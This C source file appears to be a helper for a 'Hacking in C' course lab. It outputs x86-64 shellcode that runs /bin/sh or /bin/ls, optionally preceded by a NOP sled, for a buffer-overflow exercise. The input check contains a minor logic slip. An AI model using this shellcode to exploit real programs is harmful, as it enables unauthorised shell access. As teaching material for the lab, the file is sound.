/* Hacking in C helper program
 *
 * This program will help you run the attack.
 * 
 * It will output the bytes of one of two shellcode programs.
 *
 * You may also have it output any amount of NOP instructions
 *
 * Author: Thom Wiggers <thom@thomwiggers.nl>
 * License: MIT
 */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// execve(/bin/sh, [/bin/sh, NULL], NULL)
char shellcode[] = 
  "\x48\x31\xc0"                             // xor %rax, %rax
  "\x48\x31\xd2"                             // xor %rdx, %rdx
  "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68" // mov $0x68732f6e69622f2f, %rbx
  "\x48\xc1\xeb\x08"                         // shr $0x8, %rbx
  "\x53"                                     // push %rbx 
  "\x48\x89\xe7"                             // mov %rsp, %rdi
  "\x52"                                     // push %rdx
  "\x57"                                     // push %rdi
  "\x48\x89\xe6"                             // mov %rsp, %rsi
  "\xb0\x3b"                                 // mov $0x3b, %al
  "\x0f\x05";                                // syscall

// execve(/bin/ls, [/bin/ls, NULL], NULL)
char listcode[] = 
  "\x48\x31\xc0"                             // xor %rax, %rax
  "\x48\x31\xd2"                             // xor %rdx, %rdx
  "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x6c\x73" // mov $0x686c2f6e69622f2f, %rbx
  "\x48\xc1\xeb\x08"                         // shr $0x8, %rbx
  "\x53"                                     // push %rbx 
  "\x48\x89\xe7"                             // mov %rsp, %rdi
  "\x52"                                     // push %rdx
  "\x57"                                     // push %rdi
  "\x48\x89\xe6"                             // mov %rsp, %rsi
  "\xb0\x3b"                                 // mov $0x3b, %al
  "\x0f\x05";                                // syscall



int main(int argc, char* argv[]) {
    unsigned long int nopbytes = 0;
    if (argc == 1 || argc > 3 || (!strncmp(argv[1], "list", 5) && !strncmp(argv[1], "shell", 5))) {
        fprintf(stderr, "Usage: %s <type> [nopbytes]\n", argv[0]);
        fprintf(stderr, "Here, we expect type to be one of these:\n");
        fprintf(stderr, "\tshell\tCode to execute /bin/sh\n");
        fprintf(stderr, "\tlist\tCode to execute /bin/ls\n");
        fprintf(stderr, "The optional argument nopbytes specifies the number of NOP instructions to prefix the code with (default 0)\n");
        fprintf(stderr, "\nWe suggest you to start with type list\n");
        return 1;
    }

    if (argc == 3) {
        char* endptr;
        nopbytes = strtoul(argv[2], &endptr, 0);
        if (*endptr != '\0') {
            fprintf(stderr, "Invalid integer literal: %s\n", argv[2]);
            return 2;
        }
    }

    for (unsigned long int i = 0; i < nopbytes; i++) {
        printf("%c", 0x90);
    }

    unsigned long int shellcode_bytes = 99999;
    if (!strncmp(argv[1], "list", 5)) {
        // minus one, null byte
        shellcode_bytes = sizeof(listcode) - 1;
        printf("%s", listcode);
    }

    if (!strncmp(argv[1], "shell", 5)) {
        // minus one, null byte
        shellcode_bytes = sizeof(shellcode) - 1;
        printf("%s", shellcode);
    }

    fprintf(stderr, "* [DEBUG] %s printed %zu bytes\n", argv[0], nopbytes + shellcode_bytes);

    return 0;
}
